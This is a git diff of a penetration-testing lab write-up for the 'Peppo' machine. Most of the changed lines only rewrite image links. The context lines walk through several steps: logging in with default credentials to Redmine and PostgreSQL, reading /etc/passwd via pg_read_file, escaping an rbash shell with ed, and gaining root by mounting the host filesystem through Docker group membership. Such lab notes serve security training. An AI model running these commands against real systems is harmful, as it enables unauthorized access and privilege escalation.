@@ -45,24 +45,24 @@ The application includes login and registration pages; however, registration err
 
 - Googled the default credentials for `Redmine` and it came back with `admin:admin` I was able to login. and changed the password. 
 
-![[2025-09-01.png]]
+![](images/2025-09-01.png)
 
-![[OSCP/08_Screenshots/PG-Peppo/2025-08-31_6.png]]
+![](images/OSCP/08_Screenshots/PG-Peppo/2025-08-31_6.png)
 
 Some interest information about versions.
 
-![[OSCP/08_Screenshots/PG-Peppo/2025-08-31_7.png]]
+![](images/OSCP/08_Screenshots/PG-Peppo/2025-08-31_7.png)
 
 - Found `robots.txt` which shows few disallowed directories.
 
-![[OSCP/08_Screenshots/PG-Peppo/2025-08-31_4.png]]
+![](images/OSCP/08_Screenshots/PG-Peppo/2025-08-31_4.png)
 # Nikto
 Nikto found nothing.
 ```
 nikto -h http://192.168.195.60:8080 | tee enum/nikto-port-8080.log
 ```
 
-![[2025-09-01_1.png]]
+![](images/2025-09-01_1.png)
 
 **Findings:**
 - User: `admin`
@@ -89,7 +89,7 @@ psql -h <ip> -p 5432 -U postgres
 ```
 
 Tried the default user and password for postgres `postgres:postgres` and got a loing.
-![[2025-09-01_2.png]]
+![](images/2025-09-01_2.png)
 
 List databases
 ```bash
@@ -99,30 +99,30 @@ List databases
 \dt # list tables: postgresql tables are relational
 ```
 
-![[2025-09-01_3.png]]
+![](images/2025-09-01_3.png)
 
 The `\du` shows the roles and we are `superuser`
-![[2025-09-01_4.png]]
+![](images/2025-09-01_4.png)
 
 ### Reading files and List them
 
 ```SQL
 SELECT * FROM pg_read_file('/etc/passwd', 0, 1000000);
 ```
-![[2025-09-01_5.png]]
+![](images/2025-09-01_5.png)
 
 ```SQL
 SELECT * FROM pg_ls_dir('/tmp');
 SELECT * FROM pg_ls_dir('/');
 ```
 
-![[2025-09-01_6.png]]
+![](images/2025-09-01_6.png)
 
 ```SQL
 SELECT * FROM pg_ls_dir('/root');
 ```
 > Permissing Denied
-> ![[2025-09-01_7.png]]
+> ![](images/2025-09-01_7.png)
 
 > Have to find ways to be able to write and execute not just reading.  
 > In a **rabbit hole** and Need to enumerate other ports to get a shell. 
@@ -132,11 +132,11 @@ SELECT * FROM pg_ls_dir('/root');
 # Port 10000
 Visiting the port `10000` has a page `hello world`
 
-![[2025-09-01_8.png]]
+![](images/2025-09-01_8.png)
 
 The `nmap` service scan shows _auth-owners_ `eleanor`
 
-![[2025-09-01_9.png]]
+![](images/2025-09-01_9.png)
 
 **Findings**
 - Potential username: `eleanor`
@@ -149,7 +149,7 @@ The `nmap` service scan shows _auth-owners_ `eleanor`
 ssh eleanor@192.168.x.x
 ```
 
-![[2025-09-01_10.png]]
+![](images/2025-09-01_10.png)
 
 - **Restricted shell (rbash):** Dropped into a restricted shell `rbash` have to escape the shell to be able to read and write/execute. 
 
@@ -160,7 +160,7 @@ echo $SHELL # /bin/rbash (this is telling it is restricted shell)
 Using [[Shell Escape]] and GTFOBins to escape the shell. 
 [GTFOBins](https://gtfobins.github.io/gtfobins/ed/) was used to break out from the restricted environment by spawning an interactive shell.
 
-![[2025-09-01_11.png]]
+![](images/2025-09-01_11.png)
 
 ```bash
 ed  
@@ -170,7 +170,7 @@ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 
 After executing the above commands and export the path environment variable which will tell the shell where to look for commands and after that the shell escape was successful and was able to execute the commands normally. 
 
-![[2025-09-01_13.png]]
+![](images/2025-09-01_13.png)
 
 **Exploitation Steps:**
 
@@ -184,7 +184,7 @@ After executing the above commands and export the path environment variable whic
 ```bash
 b8078f909f84875cfa344be5bcedbddb
 ```
-![[2025-09-01_14.png]]
+![](images/2025-09-01_14.png)
 
 ## 4. Privilege Escalation
 ### 4.1 Host Enumeration
@@ -197,7 +197,7 @@ eleanor@peppo:~$ groups
 eleanor cdrom floppy audio dip video plugdev netdev docker
 ```
 
-![[2025-09-01_15.png]]
+![](images/2025-09-01_15.png)
 
 ### Docker
 Used [[Docker]] for Privileged Escalation
@@ -207,7 +207,7 @@ Running the docker privEsc command:
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
 
-![[2025-09-01_17.png]]
+![](images/2025-09-01_17.png)
 
 - Need to find the docker `image` because there is no internet we need to use the image already exist.  let's see what is already there.
 
@@ -217,7 +217,7 @@ docker images
 
 The above command output:
 
-![[2025-09-01_16.png]]
+![](images/2025-09-01_16.png)
 
 The `Redmine` is a docker image that is already exist which is also running on the port `8080` discovered at the initial enumeration.
 
@@ -227,7 +227,7 @@ The `Redmine` is a docker image that is already exist which is also running on t
 docker run -v /:/mnt -it redmine chroot /mnt bash
 ```
 
-![[2025-09-01_18.png]]
+![](images/2025-09-01_18.png)
 
 ### 4.3 Root Flag
 
